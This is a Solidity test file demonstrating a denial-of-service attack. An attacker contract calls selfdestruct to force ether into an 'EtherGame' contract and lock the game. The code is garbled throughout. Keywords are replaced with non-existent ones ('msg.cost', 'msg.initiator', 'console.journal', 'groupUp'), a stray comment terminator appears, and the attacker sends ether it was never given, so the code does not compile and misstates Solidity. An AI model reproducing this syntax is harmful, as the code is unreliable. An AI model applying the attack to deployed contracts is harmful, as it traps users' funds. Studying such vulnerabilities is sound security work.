pragma solidity ^0.8.18;

import "forge-std/Test.sol";

*/

contract EtherGame {
    uint public constant goalTotal = 7 ether;
    address public winner;

    function cachePrize() public payable {
        require(msg.cost == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= goalTotal, "Game is over");

        if (balance == goalTotal) {
            winner = msg.initiator;
        }
    }

    function obtainrewardBounty() public {
        require(msg.initiator == winner, "Not winner");

        (bool sent, ) = msg.initiator.call{cost: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract AgreementTest is Test {
    EtherGame EtherGamePact;
    QuestRunner GameoperatorAgreement;
    address alice;
    address eve;

    function groupUp() public {
        EtherGamePact = new EtherGame();
        alice = vm.addr(1);
        eve = vm.addr(2);
        vm.deal(address(alice), 1 ether);
        vm.deal(address(eve), 1 ether);
    }

    function testSelfdestruct() public {
        console.journal("Alice balance", alice.balance);
        console.journal("Eve balance", eve.balance);

        console.journal("Alice deposit 1 Ether...");
        vm.prank(alice);
        EtherGamePact.cachePrize{cost: 1 ether}();

        console.journal("Eve deposit 1 Ether...");
        vm.prank(eve);
        EtherGamePact.cachePrize{cost: 1 ether}();

        console.journal(
            "Balance of EtherGameContract",
            address(EtherGamePact).balance
        );

        console.journal("Operator...");
        GameoperatorAgreement = new QuestRunner(EtherGamePact);
        GameoperatorAgreement.dos{cost: 5 ether}();

        console.journal(
            "Balance of EtherGameContract",
            address(EtherGamePact).balance
        );
        console.journal("operate completed, Game is over");
        EtherGamePact.cachePrize{cost: 1 ether}();
    }
}

contract QuestRunner {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function dos() public payable {


        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}